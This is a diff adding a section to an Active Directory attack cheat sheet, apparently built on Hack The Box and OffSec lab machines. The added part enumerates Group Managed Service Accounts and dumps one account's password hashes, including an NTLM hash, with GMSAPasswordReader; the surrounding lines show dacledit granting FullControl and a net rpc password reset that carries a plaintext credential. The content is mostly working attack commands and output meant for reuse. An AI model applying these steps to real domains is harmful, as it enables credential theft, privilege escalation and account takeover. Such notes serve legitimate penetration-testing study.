@@ -45,6 +45,29 @@ python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'Controlled
 
 net rpc password "TargetUser" "test@password123" -U "sequel.htb"/"ControlledUser"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
 ```
+### Abuse read right over a Group Managed Service Account (gMSA)
+```
+Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
+Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
+.\GMSAPasswordReader.exe --accountname=SVC_APACHE
+
+[*] Input username             : svc_apache$
+[*] Input domain               : HEIST.OFFSEC
+[*] Salt                       : HEIST.OFFSECsvc_apache$
+[*]       rc4_hmac             : 83AC7FECFBF44780E3AAF5D04DD368A5
+[*]       aes128_cts_hmac_sha1 : 08E643C43F775FAC782EDBB04DD40541
+[*]       aes256_cts_hmac_sha1 : 588C2BB865E771ECAADCB48ECCF4BCBCD421BF329B0133A213C83086F1A2E3D7
+[*]       des_cbc_md5          : 9E340723700454E9
+
+Calculating hashes for Current Value
+[*] Input username             : svc_apache$
+[*] Input domain               : HEIST.OFFSEC
+[*] Salt                       : HEIST.OFFSECsvc_apache$
+[*]       rc4_hmac             : 0AFF0D9DFA8B436E6688697B0A47B50C (NTLM Hash)
+[*]       aes128_cts_hmac_sha1 : C958BEE96DEE78F9035F460B91EC6D86
+[*]       aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988
+[*]       des_cbc_md5          : 0804169DCECB6102
+```
 
 ### Resource Based Constrained Delegation Attack
 ```
